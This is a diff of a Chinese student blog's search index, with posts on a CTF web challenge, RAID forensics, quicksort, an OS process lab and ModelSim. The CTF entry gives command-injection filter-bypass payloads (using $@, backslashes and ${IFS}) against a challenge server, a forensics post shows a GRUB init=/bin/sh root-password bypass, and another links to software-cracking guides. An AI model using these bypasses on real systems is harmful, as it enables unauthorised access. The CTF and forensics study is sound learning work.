@@ -1,19 +1,33 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>babeRCE</title>
-    <url>/2021/10/01/babeRCE/</url>
-    <content><![CDATA[<h2 id="babeRCE"><a href="#babeRCE" class="headerlink" title="babeRCE"></a>babeRCE</h2><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p><img src="/2021/10/01/babeRCE/image-20211001235119791.png" alt="image-20211001235119791"></p>
-<p>解题思路</p>
-<p>输入  47.93.215.154:5000/?rce=ls  可以得到   flag.php index.php</p>
-<p>目标就是实现指令cat flag.php 不过需要绕开指令检测</p>
-<p>在指令中穿插 \ 或 $@ 即可绕开， ${IFS} 可以代替空格</p>
-<p><code>http://47.93.215.154:5000/?rce=ca$@t$&#123;IFS&#125;fla$@g.php</code></p>
-<p><code>http://47.93.215.154:5000/?rce=ca\t$&#123;IFS&#125;fla\g.php</code></p>
-<p>其他的还有待补充</p>
+    <title>RAID重组</title>
+    <url>/2021/10/13/RAID%E9%87%8D%E7%BB%84/</url>
+    <content><![CDATA[<h3 id="修改root密码"><a href="#修改root密码" class="headerlink" title="修改root密码"></a>修改root密码</h3><h4 id="方案一："><a href="#方案一：" class="headerlink" title="方案一："></a>方案一：</h4><p>添加grub启动参数 rw init=/bin/sh 或者 sysroot/bin/sh</p>
+<p>chroot &amp; passwd</p>
+<h5 id="虚拟机方面"><a href="#虚拟机方面" class="headerlink" title="虚拟机方面"></a>虚拟机方面</h5><p>使用取证大师挂载到本地，然后在添加设备中添加RAID硬盘组本地磁盘进行重组</p>
+<p><img src="/2021/10/13/RAID%E9%87%8D%E7%BB%84/image-20211013002605156.png" alt="image-20211013002605156"></p>
+<p>导入虚拟机时注意使用转化好的虚拟磁盘（需要全部导入，并且一般选取其中最大的可能包含操作系统的放在首位导入）</p>
+<p><img src="/2021/10/13/RAID%E9%87%8D%E7%BB%84/image-20211013002917659.png" alt="image-20211013002917659"></p>
+<p><img src="/2021/10/13/RAID%E9%87%8D%E7%BB%84/image-20211013003021252.png" alt="image-20211013003021252"></p>
+<p>对其中 ro进行改写为 rw init=sysroot\bin\sh, 即可绕过密码进入系统</p>
+<p>后输入chroot sysroot/ 更换根目录</p>
+<p>之后就可以用passwd来设置新密码</p>
+<p>输入exit后reboot来重启</p>
+<h4 id="方案二："><a href="#方案二：" class="headerlink" title="方案二："></a>方案二：</h4><p>挂在可启动的系统上</p>
+<p>Chroot &amp; passwd</p>
+<p><img src="/2021/10/13/RAID%E9%87%8D%E7%BB%84/image-20211013004758124.png" alt="image-20211013004758124"></p>
+<h3 id="一些命令"><a href="#一些命令" class="headerlink" title="一些命令"></a>一些命令</h3><p>ls -lh</p>
+<p>cat ect/hostname</p>
+<p>fdisk -l 可以查看挂载那些硬盘</p>
+<p>fdisk -l 1 less 可以查看有哪些设备</p>
+<p>mdadm –help 获取帮助</p>
+<p>mdadm –detail /dev/md5</p>
+<p>lvm 下 lvdisplay</p>
+<p><img src="/2021/10/13/RAID%E9%87%8D%E7%BB%84/image-20211113174147589.png" alt="image-20211113174147589"></p>
 ]]></content>
       <tags>
-        <tag>web</tag>
+        <tag>电子数据取证</tag>
       </tags>
   </entry>
   <entry>
@@ -296,6 +310,22 @@
       </tags>
   </entry>
   <entry>
+    <title>babeRCE</title>
+    <url>/2021/10/01/babeRCE/</url>
+    <content><![CDATA[<h2 id="babeRCE"><a href="#babeRCE" class="headerlink" title="babeRCE"></a>babeRCE</h2><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p><img src="/2021/10/01/babeRCE/image-20211001235119791.png" alt="image-20211001235119791"></p>
+<p>解题思路</p>
+<p>输入  47.93.215.154:5000/?rce=ls  可以得到   flag.php index.php</p>
+<p>目标就是实现指令cat flag.php 不过需要绕开指令检测</p>
+<p>在指令中穿插 \ 或 $@ 即可绕开， ${IFS} 可以代替空格</p>
+<p><code>http://47.93.215.154:5000/?rce=ca$@t$&#123;IFS&#125;fla$@g.php</code></p>
+<p><code>http://47.93.215.154:5000/?rce=ca\t$&#123;IFS&#125;fla\g.php</code></p>
+<p>其他的还有待补充</p>
+]]></content>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>crypto入门小知识</title>
     <url>/2021/10/03/crypto%E5%85%A5%E9%97%A8%E5%B0%8F%E7%9F%A5%E8%AF%86/</url>
     <content><![CDATA[<h2 id="crypto加密类型简介"><a href="#crypto加密类型简介" class="headerlink" title="crypto加密类型简介"></a>crypto加密类型简介</h2><h3 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h3><blockquote>
@@ -336,6 +366,15 @@
 ]]></content>
       <tags>
         <tag>crypto</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>springboot笔记</title>
+    <url>/2022/02/21/springboot%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p>1</p>
+]]></content>
+      <tags>
+        <tag>北斗斗斗</tag>
       </tags>
   </entry>
   <entry>
@@ -444,58 +483,6 @@
 ]]></content>
       <tags>
         <tag>电子数据取证</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>modelsim安装破解</title>
-    <url>/2022/05/10/modelsim%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/</url>
-    <content><![CDATA[<p>转自以下网站</p>
-<p><a href="https://blog.csdn.net/weixin_42837669/article/details/109657799">(56条消息) Modelsim下载 安装 与 和谐教程_正直的阿康的博客-CSDN博客_modelsim下载</a></p>
-<p><img src="/2022/05/10/modelsim%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/image-20220510212056621.png" alt="image-20220510212056621"></p>
-<p>[<a href="http://www.jyguagua.com/?p=9715">已解决]ModelSim出现Unable to checkout a viewer license | 勤奋的小青蛙 (jyguagua.com)</a></p>
-<p><img src="/2022/05/10/modelsim%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/image-20220510212011504.png" alt="image-20220510212011504"></p>
-]]></content>
-      <tags>
-        <tag>软件工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RAID重组</title>
-    <url>/2021/10/13/RAID%E9%87%8D%E7%BB%84/</url>
-    <content><![CDATA[<h3 id="修改root密码"><a href="#修改root密码" class="headerlink" title="修改root密码"></a>修改root密码</h3><h4 id="方案一："><a href="#方案一：" class="headerlink" title="方案一："></a>方案一：</h4><p>添加grub启动参数 rw init=/bin/sh 或者 sysroot/bin/sh</p>
-<p>chroot &amp; passwd</p>
-<h5 id="虚拟机方面"><a href="#虚拟机方面" class="headerlink" title="虚拟机方面"></a>虚拟机方面</h5><p>使用取证大师挂载到本地，然后在添加设备中添加RAID硬盘组本地磁盘进行重组</p>
-<p><img src="/2021/10/13/RAID%E9%87%8D%E7%BB%84/image-20211013002605156.png" alt="image-20211013002605156"></p>
-<p>导入虚拟机时注意使用转化好的虚拟磁盘（需要全部导入，并且一般选取其中最大的可能包含操作系统的放在首位导入）</p>
-<p><img src="/2021/10/13/RAID%E9%87%8D%E7%BB%84/image-20211013002917659.png" alt="image-20211013002917659"></p>
-<p><img src="/2021/10/13/RAID%E9%87%8D%E7%BB%84/image-20211013003021252.png" alt="image-20211013003021252"></p>
-<p>对其中 ro进行改写为 rw init=sysroot\bin\sh, 即可绕过密码进入系统</p>
-<p>后输入chroot sysroot/ 更换根目录</p>
-<p>之后就可以用passwd来设置新密码</p>
-<p>输入exit后reboot来重启</p>
-<h4 id="方案二："><a href="#方案二：" class="headerlink" title="方案二："></a>方案二：</h4><p>挂在可启动的系统上</p>
-<p>Chroot &amp; passwd</p>
-<p><img src="/2021/10/13/RAID%E9%87%8D%E7%BB%84/image-20211013004758124.png" alt="image-20211013004758124"></p>
-<h3 id="一些命令"><a href="#一些命令" class="headerlink" title="一些命令"></a>一些命令</h3><p>ls -lh</p>
-<p>cat ect/hostname</p>
-<p>fdisk -l 可以查看挂载那些硬盘</p>
-<p>fdisk -l 1 less 可以查看有哪些设备</p>
-<p>mdadm –help 获取帮助</p>
-<p>mdadm –detail /dev/md5</p>
-<p>lvm 下 lvdisplay</p>
-<p><img src="/2021/10/13/RAID%E9%87%8D%E7%BB%84/image-20211113174147589.png" alt="image-20211113174147589"></p>
-]]></content>
-      <tags>
-        <tag>电子数据取证</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>springboot笔记</title>
-    <url>/2022/02/21/springboot%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<p>1</p>
-]]></content>
-      <tags>
-        <tag>北斗斗斗</tag>
       </tags>
   </entry>
   <entry>
@@ -777,6 +764,41 @@
       </tags>
   </entry>
   <entry>
+    <title>博客更新流程</title>
+    <url>/2021/10/01/%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%E6%B5%81%E7%A8%8B/</url>
+    <content><![CDATA[<h1 id="第一次更新"><a href="#第一次更新" class="headerlink" title="第一次更新"></a>第一次更新</h1><h2 id="博客流程"><a href="#博客流程" class="headerlink" title="博客流程"></a>博客流程</h2><h3 id="1、写博客"><a href="#1、写博客" class="headerlink" title="1、写博客"></a>1、写博客</h3><p>执行 hexo new “名字”，hexo 创建该 md 文件，使用 typora 编辑并保存</p>
+<h3 id="2、清缓存-amp-更新渲染"><a href="#2、清缓存-amp-更新渲染" class="headerlink" title="2、清缓存&amp;更新渲染"></a>2、清缓存&amp;更新渲染</h3><p>执行hexo clean清除缓存，</p>
+<p>随后执行hexo g重新渲染静态页面</p>
+<h3 id="3、推送到码云"><a href="#3、推送到码云" class="headerlink" title="3、推送到码云"></a>3、推送到码云</h3><p>执行hexo d</p>
+<h3 id="5-预览本地静态界面"><a href="#5-预览本地静态界面" class="headerlink" title="5.预览本地静态界面"></a>5.预览本地静态界面</h3><p>执行hexo s</p>
+<h3 id="6、更新码云的静态页面"><a href="#6、更新码云的静态页面" class="headerlink" title="6、更新码云的静态页面"></a>6、更新码云的静态页面</h3><p><img src="/2021/10/01/%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%E6%B5%81%E7%A8%8B/alpha.png"></p>
+<h3 id="7、重新访问网站"><a href="#7、重新访问网站" class="headerlink" title="7、重新访问网站"></a>7、重新访问网站</h3><p>如果遇到多次刷新无效果的情况。可以试试按F12在网络项下刷新</p>
+<p>=-=-=-=-=-=-=-=-=-=-=-=–=-=-=-=-=-=-=-=-=-=-=-=-=-手打的分割线=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</p>
+<hr>
+<h1 id="第二次更新"><a href="#第二次更新" class="headerlink" title="第二次更新"></a>第二次更新</h1><p>关于butterfly主题，只是刚刚入门，对于自定义方面尚未搞明白</p>
+<h2 id="避雷"><a href="#避雷" class="headerlink" title="避雷"></a>避雷</h2><p><img src="/2021/10/01/%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%E6%B5%81%E7%A8%8B/image-20211124112611676.png" alt="image-20211124112611676"></p>
+<p>这个字数统计目前还是不要打开为好，经过反复测试发现如果enable值为true时会报错，博客无法正常加载，太菜了所以不知道原因。。。</p>
+<h2 id="添加博客标签图片"><a href="#添加博客标签图片" class="headerlink" title="添加博客标签图片"></a>添加博客标签图片</h2><p><img src="/2021/10/01/%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%E6%B5%81%E7%A8%8B/image-20211124112741755.png" alt="image-20211124112741755"></p>
+<p>在default_cover下照着这样添加图片即可，随机配图，比较省事，感觉效果还可以，如果有时间的话还可以试试自定义配置封面图片</p>
+]]></content>
+      <tags>
+        <tag>博客入门</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>modelsim安装破解</title>
+    <url>/2022/05/10/modelsim%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/</url>
+    <content><![CDATA[<p>转自以下网站</p>
+<p><a href="https://blog.csdn.net/weixin_42837669/article/details/109657799">(56条消息) Modelsim下载 安装 与 和谐教程_正直的阿康的博客-CSDN博客_modelsim下载</a></p>
+<p><img src="/2022/05/10/modelsim%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/image-20220510212056621.png" alt="image-20220510212056621"></p>
+<p>[<a href="http://www.jyguagua.com/?p=9715">已解决]ModelSim出现Unable to checkout a viewer license | 勤奋的小青蛙 (jyguagua.com)</a></p>
+<p><img src="/2022/05/10/modelsim%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/image-20220510212011504.png" alt="image-20220510212011504"></p>
+]]></content>
+      <tags>
+        <tag>软件工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>反序列化</title>
     <url>/2021/10/02/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<h2 id="eeeeeeeeeeezunserialize"><a href="#eeeeeeeeeeezunserialize" class="headerlink" title="eeeeeeeeeeezunserialize"></a>eeeeeeeeeeezunserialize</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2021/10/02/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211002114245428.png" alt="image-20211002114245428"></p>
@@ -800,6 +822,17 @@
 ]]></content>
       <tags>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>快速排序</title>
+    <url>/2021/11/26/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/</url>
+    <content><![CDATA[<h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><p>之前一直习惯于冒泡排序，无奈到了大二竟然算法和数据结构还是啥也不会。还是一步一步来吧。</p>
+<h2 id="主要代码"><a href="#主要代码" class="headerlink" title="主要代码"></a>主要代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(<span class="keyword">int</span> s[], <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &lt; r) <span class="comment">//加上这步，防止陷入死循环</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//Swap(s[l], s[(l + r) / 2]); //将中间的这个数和第一个数交换 参见注1</span></span><br><span class="line">        <span class="keyword">int</span> i = l, j = r;</span><br><span class="line">        <span class="keyword">int</span> x = s[l]; <span class="comment">//x作为基准</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt; j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; s[j] &gt;= x) <span class="comment">// 从右向左找第一个小于x的数</span></span><br><span class="line">                j--;  </span><br><span class="line">            <span class="keyword">if</span>(i &lt; j) </span><br><span class="line">                s[i++] = s[j];</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; s[i] &lt; x) <span class="comment">// 从左向右找第一个大于等于x的数</span></span><br><span class="line">                i++;  </span><br><span class="line">            <span class="keyword">if</span>(i &lt; j) </span><br><span class="line">                s[j--] = s[i];</span><br><span class="line">        &#125;</span><br><span class="line">        s[i] = x;</span><br><span class="line">        quick_sort(s, l, i - <span class="number">1</span>); <span class="comment">// 递归调用 </span></span><br><span class="line">        quick_sort(s, i + <span class="number">1</span>, r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>算法与数据结构</tag>
       </tags>
   </entry>
   <entry>
@@ -1031,36 +1064,141 @@
       </tags>
   </entry>
   <entry>
-    <title>快速排序</title>
-    <url>/2021/11/26/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/</url>
-    <content><![CDATA[<h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><p>之前一直习惯于冒泡排序，无奈到了大二竟然算法和数据结构还是啥也不会。还是一步一步来吧。</p>
-<h2 id="主要代码"><a href="#主要代码" class="headerlink" title="主要代码"></a>主要代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(<span class="keyword">int</span> s[], <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &lt; r) <span class="comment">//加上这步，防止陷入死循环</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//Swap(s[l], s[(l + r) / 2]); //将中间的这个数和第一个数交换 参见注1</span></span><br><span class="line">        <span class="keyword">int</span> i = l, j = r;</span><br><span class="line">        <span class="keyword">int</span> x = s[l]; <span class="comment">//x作为基准</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt; j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; s[j] &gt;= x) <span class="comment">// 从右向左找第一个小于x的数</span></span><br><span class="line">                j--;  </span><br><span class="line">            <span class="keyword">if</span>(i &lt; j) </span><br><span class="line">                s[i++] = s[j];</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; s[i] &lt; x) <span class="comment">// 从左向右找第一个大于等于x的数</span></span><br><span class="line">                i++;  </span><br><span class="line">            <span class="keyword">if</span>(i &lt; j) </span><br><span class="line">                s[j--] = s[i];</span><br><span class="line">        &#125;</span><br><span class="line">        s[i] = x;</span><br><span class="line">        quick_sort(s, l, i - <span class="number">1</span>); <span class="comment">// 递归调用 </span></span><br><span class="line">        quick_sort(s, i + <span class="number">1</span>, r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    <title>操作系统上机实验一</title>
+    <url>/2022/05/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C%E4%B8%80/</url>
+    <content><![CDATA[<h2 id="实验一-进程的建立"><a href="#实验一-进程的建立" class="headerlink" title="实验一   进程的建立"></a><strong>实验一</strong>   进程的建立</h2><h3 id="【实验软硬件环境】"><a href="#【实验软硬件环境】" class="headerlink" title="【实验软硬件环境】"></a>【实验软硬件环境】</h3><p> Linux、Win11、GCC</p>
+<h3 id="【实验目的与内容】"><a href="#【实验目的与内容】" class="headerlink" title="【实验目的与内容】"></a>【实验目的与内容】</h3><p>​    学会通过基本的Linux进程控制函数， 有父进程创建子进程，并实现协同工作。 创建两个进程，让子进程读取输入，父进 程等待子进程读完文件后继续执行。</p>
+<h3 id="【实验程序及分析】"><a href="#【实验程序及分析】" class="headerlink" title="【实验程序及分析】"></a>【实验程序及分析】</h3><h4 id="Windows系统下"><a href="#Windows系统下" class="headerlink" title="Windows系统下"></a>Windows系统下</h4><h5 id="父进程代码-father-cpp"><a href="#父进程代码-father-cpp" class="headerlink" title="父进程代码 father.cpp"></a>父进程代码 father.cpp</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	STARTUPINFO sui;               <span class="comment">//启动信息结构体 </span></span><br><span class="line">	PROCESS_INFORMATION pi;      <span class="comment">//在创建进程时相关的数据结构之一，该结构返回有关新进程及其主线程的信息。</span></span><br><span class="line">	ZeroMemory(&amp;sui,<span class="keyword">sizeof</span>(sui));</span><br><span class="line">	sui.cb = <span class="keyword">sizeof</span>(STARTUPINFO);  <span class="comment">//将cb成员设置为信息结构体的大小</span></span><br><span class="line">	<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> content[<span class="number">100</span>] = <span class="string">&quot;&quot;</span>;          <span class="comment">//初始化content字符数组用来存放文件内容 </span></span><br><span class="line">	<span class="keyword">if</span>(CreateProcess(<span class="string">&quot;child.exe&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,FALSE,CREATE_NEW_CONSOLE,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;sui,&amp;pi))<span class="comment">//创建进程 </span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;已创建一个子进程\n&quot;</span>);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			sum = sum + i;       <span class="comment">//求1-100之和 </span></span><br><span class="line">			Sleep(<span class="number">5</span>);            <span class="comment">//延迟时间5ms</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Now, sum = %d\n&quot;</span>,sum);</span><br><span class="line">		&#125;</span><br><span class="line">		WaitForSingleObject(pi.hProcess,INFINITE);  <span class="comment">//一直等下去直到进程结束 </span></span><br><span class="line">		FILE *fp = fopen(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">		fread(content,<span class="keyword">sizeof</span>(<span class="keyword">char</span>),<span class="number">100</span>,fp);           <span class="comment">//设置读取文件内容的相关参数 </span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;子进程创建的文件内容如下:\n\n%s\n\n&quot;</span>,content);</span><br><span class="line">		fclose(fp);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;创建子进程失败\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;父进程结束运行&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;实验结束！&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-]]></content>
+<h5 id="子进程代码-child-cpp"><a href="#子进程代码-child-cpp" class="headerlink" title="子进程代码 child.cpp"></a>子进程代码 child.cpp</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;子进程开始运行...\n\n&quot;</span>);</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *something = <span class="string">&quot;aaaaa&quot;</span>;</span><br><span class="line">	FILE *fp;</span><br><span class="line">	<span class="keyword">if</span> (fp = fopen(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;w+&quot;</span>)) &#123;          <span class="comment">//以可读写方式打开文件</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;文件打开成功!\n\n&quot;</span>);</span><br><span class="line">		fwrite(something, <span class="built_in">strlen</span>(something), <span class="number">1</span>, fp); <span class="comment">//将something写入文件中</span></span><br><span class="line">		fwrite(<span class="string">&quot;\nbbbbb&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;\nbbbbb&quot;</span>), <span class="number">1</span>, fp); <span class="comment">//将另一句话写入文件中</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;写入数据成功!\n\n&quot;</span>);</span><br><span class="line">		fclose(fp);<span class="comment">//关闭文件</span></span><br><span class="line">		fp = fopen(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);              <span class="comment">//以只读方式打开文件</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;当前文件中的内容如下：\n&quot;</span>);</span><br><span class="line">		<span class="keyword">char</span> ch = fgetc(fp);                     <span class="comment">//取第一个字符</span></span><br><span class="line">		<span class="keyword">while</span> (ch != EOF) &#123;                   <span class="comment">//当该字符不为文件结束标志时</span></span><br><span class="line">			<span class="built_in">putchar</span>(ch);                       <span class="comment">//输出该字符</span></span><br><span class="line">			ch = fgetc(fp);                    <span class="comment">//继续从文件中获取字符</span></span><br><span class="line">		&#125;</span><br><span class="line">		fclose(fp);                            <span class="comment">//关闭文件</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n子进程结束运行&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;创建文件失败!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><ol>
+<li><p>在父进程中创建子进程代码    </p>
+<p><code>CreateProcess(&quot;child.exe&quot;,NULL,NULL,NULL,FALSE,CREATE_NEW_CONSOLE,NULL,NULL,&amp;sui,&amp;pi)</code></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcess</span><span class="params">( </span></span></span><br><span class="line"><span class="params"><span class="function"> LPCTSTR lpApplicationName, </span></span></span><br><span class="line"><span class="params"><span class="function"> LPTSTR lpCommandLine, </span></span></span><br><span class="line"><span class="params"><span class="function"> LPSECURITY_ATTRIBUTES lpProcessAttributes, </span></span></span><br><span class="line"><span class="params"><span class="function"> LPSECURITY_ATTRIBUTES lpThreadAttributes, </span></span></span><br><span class="line"><span class="params"><span class="function"> BOOL bInheritHandles, </span></span></span><br><span class="line"><span class="params"><span class="function"> DWORD dwCreationFlags, </span></span></span><br><span class="line"><span class="params"><span class="function"> LPVOID lpEnvironment, </span></span></span><br><span class="line"><span class="params"><span class="function"> LPCTSTR lpCurrentDirectory, </span></span></span><br><span class="line"><span class="params"><span class="function"> LPSTARTUPINFO lpStartupInfo, </span></span></span><br><span class="line"><span class="params"><span class="function"> LPPROCESS_INFORMATION lpProcessInformation )</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>lpApplicationName</code>：子进程名，注意，应包含完整的路径名，且路径名 中出现斜杠处应多加一个反斜杠（转义字符）， 如<code>..\\EventChild\\Debug\\EventChild.exe</code> </p>
+<p><code>lpCommandLine</code>：命令行参数，可设为NULL。 </p>
+<p><code>lpProcessAttributes</code>、<code>lpThreadAttributes</code>：进程、纯种的安全描述符，可设为 NULL表示默认的安全描述。 </p>
+<p><code>bInheritHandles</code>：打前进程中打开的句柄是否可以被子进程所继承。</p>
+<p><code>dwCreationFlags</code>：表示子进程的创建状态和优化级别。本实例中设为CREATE_NEW_CONSOLE，表示为子进程创建一个新的控制台。</p>
+<p><code>lpEnvironmen</code>t：子进程所使用的环境变量。设为NULL表示与当前进程使用相同 的环境变量。 </p>
+<p><code>lpCurrentDirector</code>y：子进程运行的初始目录。若为NULL表示与调用进程有相同 的目录。 </p>
+<p><code>lpStartupInfo</code>：用于设置子进程的各种属性。</p>
+<p><img src="/2022/05/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C%E4%B8%80/clip_image002.png" alt="img"></p>
+<p><code>LPCTSTR lpName</code>：用于返回新进程的信息。</p>
+<p><img src="/2022/05/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C%E4%B8%80/clip_image003.png" alt="img"></p>
+</li>
+<li><p>父进程等待子进程完成</p>
+<p><code>WaitForSingleObject(pi.hProcess,INFINITE);</code></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD **WaitForSingleObject**(HANDLE hHandle,DWORD dwMilliseconds);</span><br></pre></td></tr></table></figure>
+
+<p><code>hHandle</code>：等待的事件对象的句柄。 </p>
+<p><code>dwMilliseconds</code>：等待的时间，超时则返回。若设为0，则立即返回；若设为INFINITE，则一直等待。</p>
+<p>返回值：失败则返回WAIT_FAILED。</p>
+<p>子进程结束前<code>system(&quot;pause&quot;);</code>父进程将会一直等待下去</p>
+<p><img src="/2022/05/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C%E4%B8%80/image-20220511234852274.png" alt="image-20220511234852274"></p>
+<p>直到子进程的child.exe关闭，father.exe进程才会继续运行。</p>
+<p><img src="/2022/05/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C%E4%B8%80/image-20220511235712288.png" alt="image-20220511235712288"></p>
+</li>
+<li><p>文件的IO操作</p>
+<p>父进程中读取操作</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *fp = fopen(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">fread(content,<span class="keyword">sizeof</span>(<span class="keyword">char</span>),<span class="number">100</span>,fp); </span><br></pre></td></tr></table></figure>
+
+<p>子进程中写入操作</p>
